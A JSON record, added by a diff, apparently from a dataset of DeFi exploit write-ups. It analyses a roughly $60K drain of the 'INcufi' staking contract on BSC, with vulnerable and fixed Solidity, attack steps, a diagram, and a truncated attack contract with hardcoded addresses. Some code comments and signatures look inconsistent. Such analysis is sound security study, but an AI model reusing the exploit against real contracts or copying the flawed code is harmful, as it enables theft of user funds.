@@ -1,0 +1,39 @@
+{
+ "id": "2024__2024-06-XX_INcufi_StakeZeroDayWithdralSwapCommision",
+ "source_file": "2024/2024-06-XX_INcufi_StakeZeroDayWithdralSwapCommision.md",
+ "title": "INcufi — STAKE() 0-Day Duration + withdral() + swapCommision() CREATE2 Exploit Analysis",
+ "date": "2024-06-01",
+ "protocol": "INcufi",
+ "chain": "BSC",
+ "loss_raw": "~$60,000",
+ "loss_usd": 60000.0,
+ "root_cause": "The `STAKE()` function allows a lock duration of 0, the `withdral()` function contains a typo that bypasses internal validation, and `swapCommision()` accumulates fees to referrer addresses created via CREATE2 which are then drained",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: STAKE allows 0-day duration + withdral validation bug\ncontract Ncufi {\n    struct StakeInfo {\n        uint256 amount;\n        uint256 lockDuration; // 0 allowed\n        uint256 startTime;\n        uint256 commission;\n    }\n    mapping(address => StakeInfo) public stakes;\n\n    // Allows lockDuration of 0 — immediate withdrawal possible\n    function STAKE(uint256 amount, uint256 lockDuration, address referrer) external {\n        // lockDuration >= 0 allowed (0-day staking possible)\n        stakes[msg.sender] = StakeInfo(amount, lockDuration, block.timestamp, 0);\n        token.transferFrom(msg.sender, address(this), amount);\n        // Accumulate commission for referrer\n        stakes[referrer].commission += calculateCommission(amount);\n    }\n\n    // Typo: withdral (not withdraw) — lock validation bug\n    function withdral(uint256 amount) external {\n        StakeInfo storage info = stakes[msg.sender];\n        // Bug: condition always passes when lockDuration == 0\n        require(block.timestamp >= info.startTime + info.lockDuration, \"locked\");\n        info.amount -= amount;\n        token.transfer(msg.sender, amount + info.commission);\n        info.commission = 0;\n    }\n\n    // Fee draining via CREATE2 referrer\n    function swapCommision(address referrer) external {\n        // No referrer address validation\n        uint256 comm = stakes[referrer].commission;\n        stakes[referrer].commission = 0;\n        AKITADEF.transfer(msg.sender, comm);\n    }\n}\n\n//",
+  "// File: INcufi_decompiled.sol\ncontract INcufi {\n    function STAKE(uint256 p0, uint256 p1, uint256 p2) external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code\nfunction STAKE(uint256 amount, uint256 lockDuration, address referrer) external {\n    require(lockDuration >= MIN_LOCK_DURATION, \"lock too short\");\n    require(referrer != address(0) && referrer != msg.sender, \"invalid referrer\");\n    // ...\n}\n\nfunction withdraw(uint256 amount) external {\n    StakeInfo storage info = stakes[msg.sender];\n    require(block.timestamp >= info.startTime + info.lockDuration, \"locked\");\n    require(info.amount >= amount, \"insufficient\");\n    info.amount -= amount;\n    token.transfer(msg.sender, amount);\n}"
+ ],
+ "steps": [
+  "→ [1] Deploy 100 referrer contracts via CREATE2",
+  "Predictable addresses → registered as referrers",
+  "→ [2] STAKE(amount, 0, referrer[i]) × 100 times",
+  "lockDuration = 0 → immediate withdrawal possible",
+  "→ [3] withdral(amount) × 100 times",
+  "lockDuration=0 → block.timestamp >= startTime passes immediately",
+  "→ [4] swapCommision(referrer[i]) × 100 times",
+  "Referrer commissions → swapped for AKITADEF tokens",
+  "No commission validation → mass drain",
+  "→ [5] ~$60K AKITADEF drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Deploy 100 referrer contracts via CREATE2\n  │         └─ Predictable addresses → registered as referrers\n  │\n  ├─→ [2] STAKE(amount, 0, referrer[i]) × 100 times\n  │         └─ lockDuration = 0 → immediate withdrawal possible\n  │         └─ Referrer commissions accumulate\n  │\n  ├─→ [3] withdral(amount) × 100 times\n  │         └─ lockDuration=0 → block.timestamp >= startTime passes immediately\n  │         └─ Stake principal + commission recovered instantly\n  │\n  ├─→ [4] swapCommision(referrer[i]) × 100 times\n  │         └─ Referrer commissions → swapped for AKITADEF tokens\n  │         └─ No commission validation → mass drain\n  │\n  └─→ [5] ~$60K AKITADEF drained",
+  "interface INcufi {\n    function STAKE(uint256 amount, uint256 lockDuration, address referrer) external;\n    function withdral(uint256 amount) external;\n    function swapCommision(address referrer) external;\n}\n\ncontract ReferrerContract {\n    // Referrer contract deployed via CREATE2\n}\n\ncontract AttackContract {\n    INcufi constant ncufi = INcufi(0x80df77b2Ae5828FF499A735ee823D6CD7Cf95f5a);\n    IERC20 constant AKITADEF = IERC20(0x3213573C46eb905bA17F0Bb650E10C2352552e8a);\n\n    address[] referrers;\n\n    function testExploit() external {\n        // [1] Deploy 100 referrer contracts via CREATE2\n        for (uint i = 0; i < 100; i++) {\n            bytes32 salt = bytes32(i);\n            address referrer = address(new ReferrerContract{salt: salt}());\n            referrers.push(referrer);\n        "
+ ]
+}
